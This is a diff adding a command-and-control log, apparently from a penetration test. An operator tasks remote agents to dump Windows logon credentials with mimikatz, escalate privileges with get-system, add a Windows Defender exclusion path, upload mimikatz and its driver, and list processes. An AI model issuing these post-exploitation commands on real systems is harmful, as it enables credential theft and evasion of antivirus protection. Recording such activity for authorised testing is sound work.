@@ -1,0 +1,21 @@
+09/06/2023 02:19:56 | Info | Agent | ecfc8df697 |  | Agent Checking In
+09/06/2023 02:19:56 | Info | Agent | 4a1d715541 |  | Agent Checking In
+09/06/2023 02:19:56 | Info | Agent | f98f821236 |  | Agent Checking In
+09/06/2023 02:20:42 | Info | User | Fropops-cfd08bc1-4b26-459d-8266-10252863f816 | f98f821236 | Command tasked to agent : sleep 0
+09/06/2023 02:21:20 | Info | User | Fropops-cfd08bc1-4b26-459d-8266-10252863f816 | f98f821236 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+09/06/2023 02:21:42 | Info | User | Fropops-cfd08bc1-4b26-459d-8266-10252863f816 | f98f821236 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+09/06/2023 02:22:20 | Info | User | Fropops-cfd08bc1-4b26-459d-8266-10252863f816 | ecfc8df697 | Command tasked to agent : get-system
+09/06/2023 02:22:32 | Info | Agent | 43a8e08e05 |  | Agent Checking In
+09/06/2023 02:22:42 | Info | User | Fropops-cfd08bc1-4b26-459d-8266-10252863f816 | 43a8e08e05 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+09/06/2023 02:23:21 | Info | User | Fropops-cfd08bc1-4b26-459d-8266-10252863f816 | 43a8e08e05 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+09/06/2023 02:24:26 | Info | User | Fropops-cfd08bc1-4b26-459d-8266-10252863f816 | 43a8e08e05 | Command tasked to agent : cd c:\
+09/06/2023 02:24:41 | Info | User | Fropops-cfd08bc1-4b26-459d-8266-10252863f816 | 43a8e08e05 | Command tasked to agent : shell mkdir pentest
+09/06/2023 02:25:00 | Info | User | Fropops-cfd08bc1-4b26-459d-8266-10252863f816 | 43a8e08e05 | Command tasked to agent : ls
+09/06/2023 02:25:09 | Info | User | Fropops-cfd08bc1-4b26-459d-8266-10252863f816 | 43a8e08e05 | Command tasked to agent : cd pentest
+09/06/2023 02:25:20 | Info | User | Fropops-cfd08bc1-4b26-459d-8266-10252863f816 | 43a8e08e05 | Command tasked to agent : powershell Add-MpPreference -ExclusionPath 'C:\pentest'
+09/06/2023 02:26:38 | Info | User | Fropops-cfd08bc1-4b26-459d-8266-10252863f816 | 43a8e08e05 | Command tasked to agent : upload mimikatz.exe
+09/06/2023 02:26:58 | Info | User | Fropops-cfd08bc1-4b26-459d-8266-10252863f816 | 43a8e08e05 | Command tasked to agent : upload mimidrv.sys
+09/06/2023 02:27:04 | Info | User | Fropops-cfd08bc1-4b26-459d-8266-10252863f816 | 43a8e08e05 | Command tasked to agent : ls
+09/06/2023 02:27:30 | Info | User | Fropops-cfd08bc1-4b26-459d-8266-10252863f816 | 43a8e08e05 | Command tasked to agent : sleep 0
+09/06/2023 02:27:42 | Info | User | Fropops-cfd08bc1-4b26-459d-8266-10252863f816 | 43a8e08e05 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+09/06/2023 02:28:17 | Info | User | Fropops-cfd08bc1-4b26-459d-8266-10252863f816 | 43a8e08e05 | Command tasked to agent : ps
